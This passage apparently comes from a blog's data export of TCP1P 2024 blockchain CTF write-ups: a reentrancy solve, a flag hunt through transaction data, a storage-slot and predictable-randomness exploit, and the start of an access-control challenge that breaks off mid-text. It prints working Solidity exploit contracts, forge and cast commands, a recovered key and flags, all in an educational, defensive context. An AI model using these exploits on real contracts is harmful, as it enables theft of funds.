exploitmoney = new ExploitMoney{value: 10 ether}(); 11 exploitmoney.Exploit(); 12 vm.stopBroadcast(); 13 } 14} 1$ forge script script/ExplotMoneyScript.s.sol:ExploitMoneyScript --rpc-url $RPC_URL --interactive --broadcast Once you run this script the challenge will be solved.\nFlag: TCP1P{retrancy_attack_plus_not_so_random_captcha}\nKey Takeaways Whenever our contract is making an external call to other contracts, we need to follow the CEI (Checks, Effects, Interactions) pattern to prevent any possibility of reentrancy. The below is the CEI pattern of load() function which will prevent the re-entrancy\n1 function load(uint256 userProvidedCaptcha) public { 2 3 uint balance = balances[msg.sender]; 4 require(balance \u0026gt; 0, \u0026#34;You don\u0026#39;t have money to load XD\u0026#34;);//Checks 5 6 uint256 generatedCaptcha = captchaContract.generateCaptcha(secret); 7 require(userProvidedCaptcha == generatedCaptcha, \u0026#34;Invalid captcha\u0026#34;);//Checks 8 balances[msg.sender] = 0; //Effects 9 (bool success,) = msg.sender.call{value: balance}(\u0026#34;\u0026#34;);//Interactions 10 require(success, \u0026#39;Oh my god, what is that!?\u0026#39;); 11 12 } ","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/tcp1p-2024/unsolvable-money-captcha/","series":[{"title":"TCP1P-2024","url":"/series/tcp1p-2024/"}],"smallImg":"","tags":[{"title":"Reentrancy","url":"/tags/reentrancy/"}],"timestamp":1729627445,"title":"Unsolvable Money Captcha"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Minercraft Huh Hello h4ck3r, welcome to the world of smart contract hacking. In order to understand this writeup you need to understand foundry. Challenge Description Say, everyone knows minecraft right? The game about mining block after block after block after block\u0026hellip;..\nNOTE! You only need to spawn an instance, no need to press the \u0026ldquo;Flag\u0026rdquo; button. The isSolved() function will always return false afterall.\nExploit In the challenge description, the author mentioned that the isSolved() function will always return false. He also mentioned that there is no need to press the FLAG button to get the flag.\nIn general a challenge instance for blokchain challenges in TCP1P ctf is as follows\nFor every challenge, there will be a Setup contract, and the Setup contract will have an isSolved() function. If we make the isSolved() function return true, we can get the flag. If we are sure we have solved the challenge, we can hit the flag button in the above instance. It will check whether the isSolved() function of the Setup contract is returning true or false. If it returns true, it will give us the flag.\nBut in this challenge, the author specifically mentioned that there is no need to hit the flag button to get the flag, which means the flag is stored somewhere in the blockchain. It can be stored in any contract deployed on the blockchain corresponding to the given RPC URL, or it might be sent in any transaction as data. So, if we go through all the transactions in every block, we might get the flag. Basically, here we are using the power of transparency in the blockchain.\nFirst let\u0026rsquo;s check what is the current block number.\n1$ cast block-number --rpc-url http://45.32.119.201:44555/e915a9dc-73f1-476a-8ffb-bfece67e5eca This has returned 8, which means there were 8 blocks mined. Since we haven\u0026rsquo;t made any transactions, the block number remains the same. These 8 blocks\u0026rsquo; transactions were done while creating the instance. The flag must be in one of the transactions in one of the 8 blocks.\nNow, let\u0026rsquo;s go through each block and the corresponding transactions.\n1$ cast block 0 http://45.32.119.201:44555/e915a9dc-73f1-476a-8ffb-bfece67e5eca The zeroth block doesn\u0026rsquo;t have any transactions.\nThe first block has a single transaction. Now lets check more details about transaction\n1$ cast tx --rpc-url http://45.32.119.201:44555/e915a9dc-73f1-476a-8ffb-bfece67e5eca 0x97ae009b944f46aa80772e19f2c28c2261d530d06859331915d87036e5e70638 In the transaction details, we need to focus only on the input data because whatever the transaction is—whether it is creating a contract, interacting with a contract, or sending some ETH to another person everything will contain some input data.\nIn the above transaction there is a bunch of hex data. It is probably a contract but still why to take the change let\u0026rsquo;s decode it to ASCII using cyberchef. The output is as follows.\nIn the same way, we need to find transactions in each block and decode the input in each transaction.\nIn the search for the flag, I have found some fake flags and some texts.\nfake-flag 1: TCP3P{this_is_one_p_not_three_p}\ntext 1: Oh, I changed my mind again!\ntext 2: Nah, that does not sound good\ntext 3: TCP1P\u0026hellip;.\nSo finally in block number 6 i got the original flag.\nFlag: TCP1P{running_through_some_blocks_have_you?}\nKey Takeaways We shouldn\u0026rsquo;t store any sensitive information on the blockchain. Since the blockchain is meant for transparency, everyone can see each transaction.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/tcp1p-2024/minecraft-huh/","series":[{"title":"TCP1P-2024","url":"/series/tcp1p-2024/"}],"smallImg":"","tags":[{"title":"Transparency of Blockchain","url":"/tags/transparency-of-blockchain/"}],"timestamp":1729627347,"title":"Minecraft Huh"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Injus Gambit Hello h4ck3r, welcome to the world of smart contract hacking. In order to understand this writeup you need to understand foundry. Key Concepts To Learn When interacting with a smart contract, our interactions are conducted through transactions. Calling a function that modifies the state of a deployed contract is considered a transaction. Changing the state involves altering the values of state variables.\nIn the Ethereum Virtual Machine (EVM), if we call a function of a smart contract that in turn calls another contract\u0026rsquo;s function, both calls will be broadcasted to the Ethereum network as a single transaction and will be mined in the same block. Check the below example to understand it more clear.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract contract_one{ 5 function guess(uint256 _num) public returns (bool){ 6 if(_num==block.timestamp){ 7 return true; 8 } 9 else{ 10 revert(\u0026#34;Incorrect Guess\u0026#34;); 11 } 12 } 13} 14 15 16contract contract_two{ 17 contract_one one; 18 constructor(address _addr){ 19 one=contract_one(_addr); 20 } 21 function call_guess()public returns (bool){ 22 uint256 guess_num=block.timestamp; 23 return one.guess(guess_num); 24 } 25} First, deploy contract_one, then deploy contract_two. In contract_one, the guess function compares block.timestamp with the number passed as an argument. If both match, it returns true.\nWhen we call a function, the function call and all its inner calls are executed as part of the same transaction. This means that within the same transaction, block.timestamp will remain constant. Therefore, we can calculate the _num based on the current block.timestamp and pass it to the guess() function to ensure a match.\nChallenge Description Inju owns all the things in the area, waiting for one worthy challenger to emerge. Rumor said, that there many ways from many different angle to tackle Inju. Are you the Challenger worthy to oppose him?\nExploit The below are the source contracts.\nSetup contract 1// SPDX-License-Identifier: UNLICENSED 2pragma solidity ^0.8.26; 3 4import \u0026#34;./Privileged.sol\u0026#34;; 5import \u0026#34;./ChallengeManager.sol\u0026#34;; 6 7contract Setup { 8 Privileged public privileged; 9 ChallengeManager public challengeManager; 10 Challenger1 public Chall1; 11 Challenger2 public Chall2; 12 13 constructor(bytes32 _key) payable{ 14 privileged = new Privileged{value: 100 ether}(); 15 challengeManager = new ChallengeManager(address(privileged), _key); 16 privileged.setManager(address(challengeManager)); 17 18 // prepare the challenger 19 Chall1 = new Challenger1{value: 5 ether}(address(challengeManager)); 20 Chall2 = new Challenger2{value: 5 ether}(address(challengeManager)); 21 } 22 23 function isSolved() public view returns(bool){ 24 return address(privileged.challengeManager()) == address(0); 25 } 26} 27 28contract Challenger1 { 29 ChallengeManager public challengeManager; 30 31 constructor(address _target) payable{ 32 require(msg.value == 5 ether); 33 challengeManager = ChallengeManager(_target); 34 challengeManager.approach{value: 5 ether}(); 35 36 } 37} 38 39contract Challenger2 { 40 ChallengeManager public challengeManager; 41 42 constructor(address _target) payable{ 43 require(msg.value == 5 ether); 44 challengeManager = ChallengeManager(_target); 45 challengeManager.approach{value: 5 ether}(); 46 } 47} Priviliged contract. 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.26; 3 4contract Privileged{ 5 6 error Privileged_NotHighestPrivileged(); 7 error Privileged_NotManager(); 8 9 struct casinoOwnerChallenger{ 10 address challenger; 11 bool isRich; 12 bool isImportant; 13 bool hasConnection; 14 bool hasVIPCard; 15 } 16 17 address public challengeManager; 18 address public casinoOwner; 19 uint256 public challengerCounter = 1; 20 21 mapping(uint256 challengerId =\u0026gt; casinoOwnerChallenger) public Requirements; 22 23 modifier onlyOwner() { 24 if(msg.sender != casinoOwner){ 25 revert Privileged_NotHighestPrivileged(); 26 } 27 _; 28 } 29 30 modifier onlyManager() { 31 if(msg.sender != challengeManager){ 32 revert Privileged_NotManager(); 33 } 34 _; 35 } 36 37 constructor() payable{ 38 casinoOwner = msg.sender; 39 } 40 41 function setManager(address _manager) public onlyOwner{ 42 challengeManager = _manager; 43 } 44 45 function fireManager() public onlyOwner{ 46 challengeManager = address(0); 47 } 48 49 function setNewCasinoOwner(address _newCasinoOwner) public onlyManager{ 50 casinoOwner = _newCasinoOwner; 51 } 52 53 function mintChallenger(address to) public onlyManager{ 54 uint256 newChallengerId = challengerCounter++; 55 56 Requirements[newChallengerId] = casinoOwnerChallenger({ 57 challenger: to, 58 isRich: false, 59 isImportant: false, 60 hasConnection: false, 61 hasVIPCard: false 62 }); 63 } 64 65 function upgradeAttribute(uint256 Id, bool _isRich, bool _isImportant, bool _hasConnection, bool _hasVIPCard) public onlyManager { 66 Requirements[Id] = casinoOwnerChallenger({ 67 challenger: Requirements[Id].challenger, 68 isRich: _isRich, 69 isImportant: _isImportant, 70 hasConnection: _hasConnection, 71 hasVIPCard: _hasVIPCard 72 }); 73 } 74 75 function resetAttribute(uint256 Id) public onlyManager{ 76 Requirements[Id] = casinoOwnerChallenger({ 77 challenger: Requirements[Id].challenger, 78 isRich: false, 79 isImportant: false, 80 hasConnection: false, 81 hasVIPCard: false 82 }); 83 } 84 85 function getRequirmenets(uint256 Id) public view returns (casinoOwnerChallenger memory){ 86 return Requirements[Id]; 87 } 88 89 function getNextGeneratedId() public view returns (uint256){ 90 return challengerCounter; 91 } 92 93 function getCurrentChallengerCount() public view returns (uint256){ 94 return challengerCounter - 1; 95 } 96} ChallengeManager contract 1// SPDX-License-Identifier: UNLICENSED 2pragma solidity ^0.8.26; 3 4import \u0026#34;./Privileged.sol\u0026#34;; 5 6contract ChallengeManager{ 7 8 Privileged public privileged; 9 10 error CM_FoundChallenger(); 11 error CM_NotTheCorrectValue(); 12 error CM_AlreadyApproached(); 13 error CM_InvalidIdOfChallenger(); 14 error CM_InvalidIdofStranger(); 15 error CM_CanOnlyChangeSelf(); 16 17 bytes32 private masterKey; 18 bool public qualifiedChallengerFound; 19 address public theChallenger; 20 address public casinoOwner; 21 uint256 public challengingFee; 22 23 address[] public challenger; 24 25 mapping (address =\u0026gt; bool) public approached; 26 27 modifier stillSearchingChallenger(){ 28 require(!qualifiedChallengerFound, \u0026#34;New Challenger is Selected!\u0026#34;); 29 _; 30 } 31 32 modifier onlyChosenChallenger(){ 33 require(msg.sender == theChallenger, \u0026#34;Not Chosen One\u0026#34;); 34 _; 35 } 36 37 constructor(address _priv, bytes32 _masterKey) { 38 casinoOwner = msg.sender; 39 privileged = Privileged(_priv); 40 challengingFee = 5 ether; 41 masterKey = _masterKey; 42 } 43 44 function approach() public payable { 45 if(msg.value != 5 ether){ 46 revert CM_NotTheCorrectValue(); 47 } 48 if(approached[msg.sender] == true){ 49 revert CM_AlreadyApproached(); 50 } 51 approached[msg.sender] = true; 52 challenger.push(msg.sender); 53 privileged.mintChallenger(msg.sender); 54 } 55 56 function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger { 57 if (challengerId \u0026gt; privileged.challengerCounter()){ 58 revert CM_InvalidIdOfChallenger(); 59 } 60 if(strangerId \u0026gt; privileged.challengerCounter()){ 61 revert CM_InvalidIdofStranger(); 62 } 63 if(privileged.getRequirmenets(challengerId).challenger != msg.sender){ 64 revert CM_CanOnlyChangeSelf(); 65 } 66 67 uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4; 68 69 if (gacha == 0){ 70 if(privileged.getRequirmenets(strangerId).isRich == false){ 71 privileged.upgradeAttribute(strangerId, true, false, false, false); 72 }else if(privileged.getRequirmenets(strangerId).isImportant == false){ 73 privileged.upgradeAttribute(strangerId, true, true, false, false); 74 }else if(privileged.getRequirmenets(strangerId).hasConnection == false){ 75 privileged.upgradeAttribute(strangerId, true, true, true, false); 76 }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){ 77 privileged.upgradeAttribute(strangerId, true, true, true, true); 78 qualifiedChallengerFound = true; 79 theChallenger = privileged.getRequirmenets(strangerId).challenger; 80 } 81 }else if (gacha == 1){ 82 if(privileged.getRequirmenets(challengerId).isRich == false){ 83 privileged.upgradeAttribute(challengerId, true, false, false, false); 84 }else if(privileged.getRequirmenets(challengerId).isImportant == false){ 85 privileged.upgradeAttribute(challengerId, true, true, false, false); 86 }else if(privileged.getRequirmenets(challengerId).hasConnection == false){ 87 privileged.upgradeAttribute(challengerId, true, true, true, false); 88 }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){ 89 privileged.upgradeAttribute(challengerId, true, true, true, true); 90 qualifiedChallengerFound = true; 91 theChallenger = privileged.getRequirmenets(challengerId).challenger; 92 } 93 }else if(gacha == 2){ 94 privileged.resetAttribute(challengerId); 95 qualifiedChallengerFound = false; 96 theChallenger = address(0); 97 }else{ 98 privileged.resetAttribute(strangerId); 99 qualifiedChallengerFound = false; 100 theChallenger = address(0); 101 } 102 } 103 104 function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{ 105 if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){ 106 privileged.setNewCasinoOwner(address(theChallenger)); 107 } 108 } 109 110 function getApproacher(address _who) public view returns(bool){ 111 return approached[_who]; 112 } 113 114 function getPrivilegedAddress() public view returns(address){ 115 return address(privileged); 116 } 117 118} In this challenge our task is make isSolved() function return true.\n1function isSolved() public view returns(bool){ 2 return address(privileged.challengeManager()) == address(0); 3} The isSolved() function returns true if the challengeManager in Privileged contract is set to address of zero.\nNow lets dive into Privileged contract.\n1function setManager(address _manager) public onlyOwner{ 2 challengeManager = _manager; 3} 4 5function fireManager() public onlyOwner{ 6 challengeManager = address(0); 7} The only way to change the challengeManager is by calling one of the two functions, both of which have the onlyOwner() modifier. This modifier ensures that only the Owner can call these functions. The Owner is set to msg.sender in the constructor. Since the Setup contract deployed the Privileged contract, the casinoOwner is the Setup contract.\nOnly the Setup contract can call the setManager() and fireManager() functions. However, the Setup contract does not have any functions that call setManager() or fireManager(). Therefore, we need to find a way to change the address of the casinoOwner so that we can directly call fireManager().\n1function setNewCasinoOwner(address _newCasinoOwner) public onlyManager{ 2 casinoOwner = _newCasinoOwner; 3} The setNewCasinoOwner() function takes an address as an argument and then executes the onlyManager modifier. If the modifier passes, it sets the casinoOwner to the provided address. Since this function can only be called by the challengeManager, we need to examine the ChallengeManager contract to find any function that calls setNewCasinoOwner() in the Privileged contract.\nNow let\u0026rsquo;s look into ChallengeManager contract.\n1function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{ 2 if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){ 3 privileged.setNewCasinoOwner(address(theChallenger)); 4 } 5} The challengeCurrentOwner() function takes a bytes32 argument and then executes the onlyChosenChallenger modifier. If the modifier passes, it compares the passed _key with the original key. If both match, it calls setNewCasinoOwner() with the address of theChallenger as the argument.\n1modifier onlyChosenChallenger(){ 2 require(msg.sender == theChallenger, \u0026#34;Not Chosen One\u0026#34;); 3 _; 4} The modifier onlyChosenChallenger() will make sure that the msg.sender (caller) is the address of theChallenger.\nIf we somehow become theChallenger, we can call challengeCurrentOwner(). This will call setNewCasinoOwner() with our address, making us the casinoOwner. Once we become the casinoOwner, we can directly call fireManager(), which will set the address of challengeManager to the zero address, thereby solving our challenge.\nThe upgradeChallengerAttribute() function is the only place where theChallenger is changed. However, before delving into this function, we need to understand a bit about the ChallengeManager contract and the challenger attributes.\nThe ChallengeManager contract controls the casinoOwner in the Privileged contract. During the deployment of the Privileged contract, the casinoOwner is set to the address of the Setup contract. The casinoOwner can be changed by the ChallengeManager. Anyone who wants to challenge the Owner needs to call the approach() function by sending 5 ether. After that, the challenger can call the upgradeChallengerAttribute() function.\n1function approach() public payable { 2 if(msg.value != 5 ether){ 3 revert CM_NotTheCorrectValue(); 4 } 5 if(approached[msg.sender] == true){ 6 revert CM_AlreadyApproached(); 7 } 8 approached[msg.sender] = true; 9 challenger.push(msg.sender); 10 privileged.mintChallenger(msg.sender); 11 } When we call the approach() function with 5 ether, it sets approached of msg.sender (the caller) to true. Then, it pushes the msg.sender (the caller\u0026rsquo;s address) into the challenger array. Finally, it calls mintChallenger() in the Privileged contract.\n1function mintChallenger(address to) public onlyManager{ 2 uint256 newChallengerId = challengerCounter++; 3 4 Requirements[newChallengerId] = casinoOwnerChallenger({ 5 challenger: to, 6 isRich: false, 7 isImportant: false, 8 hasConnection: false, 9 hasVIPCard: false 10 }); 11} The mintChallenger() function takes an address as an argument. It then initializes and loads the newChallengerId, setting the requirements of newChallengerId as an instance of the casinoOwnerChallenger struct. Except for challenger, all attributes of casinoOwnerChallenger are initialized to false.\n1function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger { 2 if (challengerId \u0026gt; privileged.challengerCounter()){ 3 revert CM_InvalidIdOfChallenger(); 4 } 5 if(strangerId \u0026gt; privileged.challengerCounter()){ 6 revert CM_InvalidIdofStranger(); 7 } 8 if(privileged.getRequirmenets(challengerId).challenger != msg.sender){ 9 revert CM_CanOnlyChangeSelf(); 10 } 11 12 uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4; 13 14 if (gacha == 0){ 15 if(privileged.getRequirmenets(strangerId).isRich == false){ 16 privileged.upgradeAttribute(strangerId, true, false, false, false); 17 }else if(privileged.getRequirmenets(strangerId).isImportant == false){ 18 privileged.upgradeAttribute(strangerId, true, true, false, false); 19 }else if(privileged.getRequirmenets(strangerId).hasConnection == false){ 20 privileged.upgradeAttribute(strangerId, true, true, true, false); 21 }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){ 22 privileged.upgradeAttribute(strangerId, true, true, true, true); 23 qualifiedChallengerFound = true; 24 theChallenger = privileged.getRequirmenets(strangerId).challenger; 25 } 26 }else if (gacha == 1){ 27 if(privileged.getRequirmenets(challengerId).isRich == false){ 28 privileged.upgradeAttribute(challengerId, true, false, false, false); 29 }else if(privileged.getRequirmenets(challengerId).isImportant == false){ 30 privileged.upgradeAttribute(challengerId, true, true, false, false); 31 }else if(privileged.getRequirmenets(challengerId).hasConnection == false){ 32 privileged.upgradeAttribute(challengerId, true, true, true, false); 33 }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){ 34 privileged.upgradeAttribute(challengerId, true, true, true, true); 35 qualifiedChallengerFound = true; 36 theChallenger = privileged.getRequirmenets(challengerId).challenger; 37 } 38 }else if(gacha == 2){ 39 privileged.resetAttribute(challengerId); 40 qualifiedChallengerFound = false; 41 theChallenger = address(0); 42 }else{ 43 privileged.resetAttribute(strangerId); 44 qualifiedChallengerFound = false; 45 theChallenger = address(0); 46 } 47 } The upgradeChallengerAttribute() function takes arguments of type uint256 (challengerId) and uint256 (strangerId). The stillSearchingChallenger modifier checks if theChallenger has already been set. If it is set, the function reverts. Otherwise, it continues execution and gets a random number between 0 and 3. Based on the random value:\nIf the value is 0, it sets attributes to the stranger\u0026rsquo;s address. If the value is 1, it sets attributes to the challenger\u0026rsquo;s address. If either of them has all attributes, they become theChallenger. If the value is 2, it resets the attributes of the challenger. If the value is 3, it resets the attributes of the stranger. In order to become theChallenger, we need to call the upgradeChallengerAttribute() function 4 times, ensuring that the gacha value is 1 each time.\nWe can acheive this by precomputing the gacha value then if the value is one we will call upgradeChallengerAttribute() 4 times with in the single transaction.\nWhen we call challengeCurrentOwner(), we need to pass the key. The function will then compare the key we passed with the masterKey. If both are the same, we will become the casinoOwner.\nSince masterKey is a private variable, we need to retrieve its value by examining the storage slots.\n1$cast storage --rpc-url $RPC_URL $ChallengeManagerAddress 1 This will return 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559. This is the key.\nThe key in ASCII is INJUINJUINJUSUPERKEYKEYKEYKEYKEY.\nSteps to Solve the Challenge Become a Challenger: Send 5 ether to call the approach() function. Precompute the Gacha Value: Calculate the gacha value to determine the outcome. Call upgradeChallengerAttribute(): If the gacha value is zero or one, call upgradeChallengerAttribute() four times. Get the Key Value: Retrieve the key value by examining the first slot of the ChallengeManager. Call challengeCurrentOwner(): Once you have all attributes, call challengeCurrentOwner() to become the casinoOwner. Call fireManager(): As the new casinoOwner, call fireManager() to set the challengeManager address to zero and solve the challenge. Below is the Exploit contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {Setup, Privileged, ChallengeManager} from \u0026#34;src/contracts/Setup.sol\u0026#34;; 5 6contract ExploitPrivileged { 7 Setup public setup = Setup(//YOUR__SETUP__ADDRESS); 8 Privileged public privileged = Privileged(setup.privileged()); 9 ChallengeManager public challengeManager = ChallengeManager(setup.challengeManager()); 10 11 constructor() payable { 12 uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4; 13 if (gacha == 0 || gacha == 1) { 14 challengeManager.approach{value: 5 ether}(); 15 for (uint8 i = 0; i \u0026lt; 4; i++) { 16 challengeManager.upgradeChallengerAttribute(3, 3); 17 } 18 challengeManager.challengeCurrentOwner(0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559); 19 privileged.fireManager(); 20 } else { 21 revert(\u0026#34;Try again\u0026#34;); 22 } 23 } 24} 1$ forge create ExploitPrivileged --rpc-url $RPC_URL --interactive --value 5ether Thank\u0026rsquo;s it for this challenge.\nFlag: TCP1P{is_it_really_a_gambit_tho_its_not_that_hard}\nKey Takeaways Even though state variables are private, they can be accessed by anyone through storage slot examination. Therefore, important keys should not be stored on the blockchain.\nIn our challenge, the gacha value is expected to be a random number, but it can be predicted or manipulated within the same transaction. Instead of determining the random values within the contract, we can use Chainlink oracles to prevent this issue.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/tcp1p-2024/injus-gambit/","series":[{"title":"TCP1P-2024","url":"/series/tcp1p-2024/"}],"smallImg":"","tags":[{"title":"Predictable Randomness","url":"/tags/predictable-randomness/"}],"timestamp":1729627295,"title":"Inju's Gambit"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Executive Problem Hello h4ck3r, welcome to the world of smart contract hacking. In order to understand this writeup you need to understand foundry. Challenge Description If only we managed to climb high enough, maybe we can dethrone someone?\nExploit The below are source contracts.\nSetup contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.26; 3 4import \u0026#34;./Crain.sol\u0026#34;; 5import \u0026#34;./CrainExecutive.sol\u0026#34;; 6 7contract Setup{ 8 CrainExecutive public cexe; 9 Crain public crain; 10 11 constructor() payable{ 12 cexe = new CrainExecutive{value: 50 ether}(); 13 crain = new Crain(payable(address(cexe))); 14 } 15 16 function isSolved() public view returns(bool){ 17 return crain.crain() != address(this); 18 } 19 20} Crain contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.26; 3 4import \u0026#34;./CrainExecutive.sol\u0026#34;; 5 6contract Crain{ 7 CrainExecutive public ce; 8 address public crain; 9 10 modifier _onlyExecutives(){ 11 require(msg.sender == address(ce), \u0026#34;Only Executives can replace\u0026#34;); 12 _; 13 } 14 15 constructor(address payable _ce) { 16 ce = CrainExecutive(_ce); 17 crain = msg.sender; 18 } 19 20 21 function ascendToCrain(address _successor) public _onlyExecutives{ 22 crain = _successor; 23 } 24 25 receive() external payable { } 26 27} CrainExecutive contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.26; 3 4contract CrainExecutive{ 5 6 address public owner; 7 uint256 public totalSupply; 8 9 address[] public Executives; 10 mapping(address =\u0026gt; uint256) public balanceOf; 11 mapping(address =\u0026gt; bool) public permissionToExchange; 12 mapping(address =\u0026gt; bool) public hasTakeBonus; 13 mapping(address =\u0026gt; bool) public isEmployee; 14 mapping(address =\u0026gt; bool) public isManager; 15 mapping(address =\u0026gt; bool) public isExecutive; 16 17 modifier _onlyOnePerEmployee(){ 18 require(hasTakeBonus[msg.sender] == false, \u0026#34;Bonus can only be taken once!\u0026#34;); 19 _; 20 } 21 22 modifier _onlyExecutive(){ 23 require(isExecutive[msg.sender] == true, \u0026#34;Only Higher Ups can access!\u0026#34;); 24 _; 25 } 26 27 modifier _onlyManager(){ 28 require(isManager[msg.sender] == true, \u0026#34;Only Higher Ups can access!\u0026#34;); 29 _; 30 } 31 32 modifier _onlyEmployee(){ 33 require(isEmployee[msg.sender] == true, \u0026#34;Only Employee can exchange!\u0026#34;); 34 _; 35 } 36 37 constructor() payable{ 38 owner = msg.sender; 39 totalSupply = 50 ether; 40 balanceOf[msg.sender] = 25 ether; 41 } 42 43 function claimStartingBonus() public _onlyOnePerEmployee{ 44 balanceOf[owner] -= 1e18; 45 balanceOf[msg.sender] += 1e18; 46 } 47 48 function becomeEmployee() public { 49 isEmployee[msg.sender] = true; 50 } 51 52 function becomeManager() public _onlyEmployee{ 53 require(balanceOf[msg.sender] \u0026gt;= 1 ether, \u0026#34;Must have at least 1 ether\u0026#34;); 54 require(isEmployee[msg.sender] == true, \u0026#34;Only Employee can be promoted\u0026#34;); 55 isManager[msg.sender] = true; 56 } 57 58 function becomeExecutive() public { 59 require(isEmployee[msg.sender] == true \u0026amp;\u0026amp; isManager[msg.sender] == true); 60 require(balanceOf[msg.sender] \u0026gt;= 5 ether, \u0026#34;Must be that Rich to become an Executive\u0026#34;); 61 isExecutive[msg.sender] = true; 62 } 63 64 function buyCredit() public payable _onlyEmployee{ 65 require(msg.value \u0026gt;= 1 ether, \u0026#34;Minimum is 1 Ether\u0026#34;); 66 uint256 totalBought = msg.value; 67 balanceOf[msg.sender] += totalBought; 68 totalSupply += totalBought; 69 } 70 71 function sellCredit(uint256 _amount) public _onlyEmployee{ 72 require(balanceOf[msg.sender] - _amount \u0026gt;= 0, \u0026#34;Not Enough Credit\u0026#34;); 73 uint256 totalSold = _amount; 74 balanceOf[msg.sender] -= totalSold; 75 totalSupply -= totalSold; 76 } 77 78 function transfer(address to, uint256 _amount, bytes memory _message) public _onlyExecutive{ 79 require(to != address(0), \u0026#34;Invalid Recipient\u0026#34;); 80 require(balanceOf[msg.sender] - _amount \u0026gt;= 0, \u0026#34;Not enough Credit\u0026#34;); 81 uint256 totalSent = _amount; 82 balanceOf[msg.sender] -= totalSent; 83 balanceOf[to] += totalSent; 84 (bool transfered, ) = payable(to).call{value: _amount}(abi.encodePacked(_message)); 85 require(transfered, \u0026#34;Failed to Transfer Credit!\u0026#34;); 86 } 87 88} In this challenge our task is make isSolved() function return true.\n1function isSolved() public view returns(bool){ 2 return crain.crain() != address(this); 3} The isSolved() function returns true if the crain() function in the Crain contract returns an address that is different from the Setup contract address.\nNow lets look into Crain contract.\n1constructor(address payable _ce) { 2 ce = CrainExecutive(_ce); 3 crain = msg.sender; 4} In the Crain contract, crain is a public variable that is set to msg.sender in the constructor. Since the Setup contract deploys the Crain contract, crain is initially set to the Setup contract address.\n1function ascendToCrain(address _successor) public _onlyExecutives{ 2 crain = _successor; 3} The only way we can change the crain address is by calling the ascendToCrain() by passing the new crain address. But it has a modifier _onlyExecutives. So in order to call this function we need to pass _onlyExecutives modifier.\n1modifier _onlyExecutives(){ 2 require(msg.sender == address(ce), \u0026#34;Only Executives can replace\u0026#34;); 3 _; 4} The _onlyExecutives() modifier ensures that msg.sender (the caller) is the address of ce (Crain Executive). The address of ce is set in the constructor. The Setup contract first deploys the Crain Executive contract and passes the address of Crain Executive as an argument to the constructor of the Crain contract.\nThe address of ce is set in the constructor and is not changed anywhere. Since we cannot change the ce address, we won\u0026rsquo;t be able to directly call the ascendToCrain() function. The only way to call ascendToCrain() is by making the Crain Executive contract call it. Therefore, we need to check if there is any place where the Crain Executive contract directly calls ascendToCrain() or makes any low-level calls.\nNow let\u0026rsquo;s look into CrainExecutive contract.\n1function transfer(address to, uint256 _amount, bytes memory _message) public _onlyExecutive{ 2 require(to != address(0), \u0026#34;Invalid Recipient\u0026#34;); 3 require(balanceOf[msg.sender] - _amount \u0026gt;= 0, \u0026#34;Not enough Credit\u0026#34;); 4 uint256 totalSent = _amount; 5 balanceOf[msg.sender] -= totalSent; 6 balanceOf[to] += totalSent; 7 (bool transfered, ) = payable(to).call{value: _amount}(abi.encodePacked(_message)); 8 require(transfered, \u0026#34;Failed to Transfer Credit!\u0026#34;); 9} The transfer() function takes three arguments: an address to, a uint256 _amount, and a bytes _message. It first executes the _onlyExecutive() modifier. If the modifier passes, it performs some balance checks. Then, it makes a low-level call to the address to with the data _message and the value _amount.\nIf we can call the transfer() function and pass the address of the Crain contract as to and the function selector of ascendToCrain() as _message, then the crain address will be changed. However, to call transfer(), we need to become the executive.\n1function becomeExecutive() public { 2 require(isEmployee[msg.sender] == true \u0026amp;\u0026amp; isManager[msg.sender] == true); 3 require(balanceOf[msg.sender] \u0026gt;= 5 ether, \u0026#34;Must be that Rich to become an Executive\u0026#34;); 4 isExecutive[msg.sender] = true; 5 } To become an executive, we need to call becomeExecutive(). We will only become an executive if we are both an employee and a manager, and our balance in the contract is at least 5 ether.\nNow let\u0026rsquo;s look into how to become employee and manager.\n1function becomeEmployee() public { 2 isEmployee[msg.sender] = true; 3} By calling the becomeEmployee() function, we will become an employee.\n1function becomeManager() public _onlyEmployee{ 2 require(balanceOf[msg.sender] \u0026gt;= 1 ether, \u0026#34;Must have at least 1 ether\u0026#34;); 3 require(isEmployee[msg.sender] == true, \u0026#34;Only Employee can be promoted\u0026#34;); 4 isManager[msg.sender] = true; 5} To become a manager, we need to call becomeManager(). We will only become a manager if we are an employee and our balance in the contract is at least 1 ether.\nTherefore, to become an executive, we need to become both a manager and an employee. To become a manager, we need 1 ether, and to become an executive, we need 5 ether. In total, we need 6 ether.\nNow we need to make our balance 6 ether. When I looked into the code, I found two ways to get 6 ether.\n1function 